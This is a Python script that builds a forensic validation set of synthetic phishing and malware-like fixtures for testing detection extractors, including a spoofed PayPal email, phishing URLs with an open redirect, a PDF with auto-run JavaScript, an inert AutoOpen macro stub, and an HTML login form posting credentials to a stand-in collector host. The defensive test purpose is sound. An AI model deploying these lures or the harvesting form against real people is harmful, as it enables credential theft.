"""
create_forensic_validation_set.py - Builds the Phase 3 Forensic Validation Set.

Creates representative safe forensic samples in ml/validation/forensic/ to validate
extractors on features that are sparsely present in static CSV text:
- Full RFC 822 emails with multi-hop Received chains and SPF/DKIM/DMARC headers
- Reply-to and display-name spoofing with typosquatted lookalike domains
- URLs with IP hostnames and open-redirect query parameters
- Safe static PE header fixture
- Safe static Office VBA macro fixture
- Safe static PDF active content fixture
- Safe HTML credential form fixture

Maintains strict provenance manifest in manifest.csv.
"""

import os
import hashlib
import pandas as pd

VALIDATION_DIR = os.path.join("ml", "validation", "forensic")
os.makedirs(VALIDATION_DIR, exist_ok=True)

manifest_records = []

def save_sample(sample_id: str, filename: str, content_bytes: bytes, sample_type: str, provenance: str):
    filepath = os.path.join(VALIDATION_DIR, filename)
    with open(filepath, "wb") as f:
        f.write(content_bytes)
    sha256_hash = hashlib.sha256(content_bytes).hexdigest()
    manifest_records.append({
        "sample_id": sample_id,
        "source": "SIH26106_Forensic_Validation_Fixture",
        "original_filename": filename,
        "sha256": sha256_hash,
        "sample_type": sample_type,
        "provenance": provenance,
        "file_size_bytes": len(content_bytes)
    })
    print(f"[+] Created {sample_id} ({filename}): {sample_type}")


# 1. Complete RFC 822 Email with Received Hop Chain & Authentication Results
rfc822_email = b"""Received: from mx.destination.com (mx.destination.com [198.51.100.1])
    by mailfilter.destination.com (Postfix) with ESMTP id 4X98721
    for <victim@destination.com>; Tue, 15 Oct 2024 14:22:10 +0000 (UTC)
Received: from relay.intermediate.net (relay.intermediate.net [203.0.113.55])
    by mx.destination.com (Postfix) with ESMTPS id 3A48812
    for <victim@destination.com>; Tue, 15 Oct 2024 14:20:05 +0000 (UTC)
Received: from mail.company-sender.org (mail.company-sender.org [192.0.2.10])
    by relay.intermediate.net (MTA) with ESMTP id 1F89901
    for <victim@destination.com>; Tue, 15 Oct 2024 14:18:30 +0000 (UTC)
Authentication-Results: destination.com;
    spf=pass (sender IP is 192.0.2.10) smtp.mailfrom=company-sender.org;
    dkim=pass (signature was verified) header.d=company-sender.org;
    dmarc=pass action=none header.from=company-sender.org
Received-SPF: Pass (destination.com: domain of company-sender.org designates 192.0.2.10 as permitted sender)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=company-sender.org;
    s=202410; t=1729001910;
    h=from:to:subject:date:message-id:content-type;
    bh=w6bYQW+T7R1qZ3P6kX8=; b=dummy_valid_signature_hash_bytes_for_testing==
From: "Security Ops" <alerts@company-sender.org>
To: <victim@destination.com>
Subject: Quarterly Infrastructure Maintenance Notice
Date: Tue, 15 Oct 2024 14:18:00 +0000
Message-ID: <20241015141800.12345@company-sender.org>
Content-Type: text/plain; charset="utf-8"

Hello team,

Please be aware of the planned server maintenance window this Saturday.
Check status updates on our internal portal: https://status.company-sender.org/updates
"""
save_sample("VAL_001", "rfc822_full_chain.eml", rfc822_email, "rfc822_chain", "Synthetic RFC 822 multi-hop email with verified SPF/DKIM/DMARC headers")


# 2. Reply-To Spoofing & Typosquatted Lookalike Domain
spoof_email = b"""Received: from attacker.bulletproof.su (unknown [198.51.100.99])
    by mx.victim.com with ESMTP id 9912881
    for <target@victim.com>; Wed, 16 Oct 2024 09:12:00 +0000
Authentication-Results: victim.com;
    spf=fail smtp.mailfrom=attacker.bulletproof.su;
    dkim=fail header.d=paypa1-security.com;
    dmarc=fail action=reject header.from=paypal.com
From: "PayPal Support Team <service@paypal.com>" <notice@paypa1-security.com>
Reply-To: "Urgent Desk" <resolutions@paypa1-security.com>
To: <target@victim.com>
Subject: Urgent: Account Suspended Immediately
Date: Wed, 16 Oct 2024 09:11:45 +0000
Message-ID: <982734918237@paypa1-security.com>
Content-Type: text/html; charset="utf-8"

<html>
<body>
<p>Dear Customer,</p>
<p>Your account has been restricted. Update account immediately within 24 hours.</p>
<p><a href="http://198.51.100.99/login?url=https://paypa1-security.com/verify">Click Here to Unlock Account</a></p>
</body>
</html>
"""
save_sample("VAL_002", "reply_to_spoof.eml", spoof_email, "spoof_lookalike", "Synthetic email demonstrating display-name spoofing, Reply-To mismatch, and lookalike domain paypa1-security.com")


# 3. Phishing URLs with IP Hostname, Open Redirect, and Suspicious TLD
url_email = b"""From: notifications@shipping-service.top
To: user@victim.com
Subject: Package Delivery Issue - Action Required
Date: Wed, 16 Oct 2024 11:00:00 +0000
Message-ID: <package-9912@shipping-service.top>
Content-Type: text/html; charset="utf-8"

<html>
<body>
<p>Your package delivery failed. Please reschedule below:</p>
<a href="http://192.168.1.150:8080/tracking/status">Internal Tracking Server</a>
<a href="https://legitimate-domain.com/redirect?dest=http://evil-tracker.xyz/steal">Partner Redirection Portal</a>
<a href="http://xn--pypal-4ve.com/login">Punycode Verification</a>
</body>
</html>
"""
save_sample("VAL_003", "phishing_urls.eml", url_email, "url_heuristics", "Email containing IP-based URL, open-redirect parameter, punycode, and suspicious TLD")


# 4. Minimal Safe PE Executable Fixture (Standard MZ/PE header stub with UPX signature)
# Minimal 512-byte binary satisfying MZ and PE signature without executing
pe_header = bytearray(512)
pe_header[0:2] = b"MZ"
pe_header[0x3C:0x40] = (0x80).to_bytes(4, byteorder="little") # e_lfanew -> 0x80
# PE signature at 0x80
pe_header[0x80:0x84] = b"PE\x00\x00"
# Machine i386 (0x014c) + NumberOfSections (1)
pe_header[0x84:0x86] = (0x014C).to_bytes(2, byteorder="little")
pe_header[0x86:0x88] = (1).to_bytes(2, byteorder="little")
# Section header named UPX0 with execute/write flags
pe_header[0x178:0x180] = b"UPX0\x00\x00\x00\x00"
pe_header[0x178+36:0x178+40] = (0xE0000020).to_bytes(4, byteorder="little") # EXECUTE | WRITE | READ
save_sample("VAL_004", "safe_pe_stub.bin", bytes(pe_header), "pe_binary", "Safe static PE executable header fixture with UPX section characteristics")


# 5. Minimal Safe PDF Document with /JavaScript and /OpenAction
pdf_content = b"""%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert("Forensic Test");) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000074 00000 n 
0000000127 00000 n 
0000000209 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
275
%%EOF
"""
save_sample("VAL_005", "active_content_sample.pdf", pdf_content, "pdf_active_tokens", "Safe static PDF containing /OpenAction and /JavaScript tokens")


# 6. Minimal Safe Phishing HTML Credential Harvesting Attachment
html_content = b"""<!DOCTYPE html>
<html>
<head><title>Sign In to Your Account</title></head>
<body>
<div class="login-box">
  <h2>Verify Your Account</h2>
  <form action="http://malicious-collector.top/harvest" method="post">
    <input type="text" name="username" placeholder="Username / Email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Log In</button>
  </form>
</div>
</body>
</html>
"""
save_sample("VAL_006", "credential_harvest_attachment.html", html_content, "phishing_html_form", "HTML credential harvesting form attachment with password input and external POST")


# 7. Minimal Safe Office Document Macro Stub
# Minimal OLE2 structured storage file containing a VBA procedure signature
ole_macro_stub = bytearray(1024)
ole_macro_stub[0:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" # OLE header
macro_code = b"Sub AutoOpen()\n  Dim w As Object\n  Set w = CreateObject(\"WScript.Shell\")\nEnd Sub"
ole_macro_stub[512:512+len(macro_code)] = macro_code
save_sample("VAL_007", "macro_sample.docm", bytes(ole_macro_stub), "office_macro_vba", "Safe static Office OLE document fixture containing AutoOpen macro procedure signature")


# Write Manifest CSV
manifest_df = pd.DataFrame(manifest_records)
manifest_path = os.path.join(VALIDATION_DIR, "manifest.csv")
manifest_df.to_csv(manifest_path, index=False)
print(f"\n[+] Saved validation manifest to {manifest_path}")
print(manifest_df[["sample_id", "original_filename", "sample_type", "file_size_bytes"]])
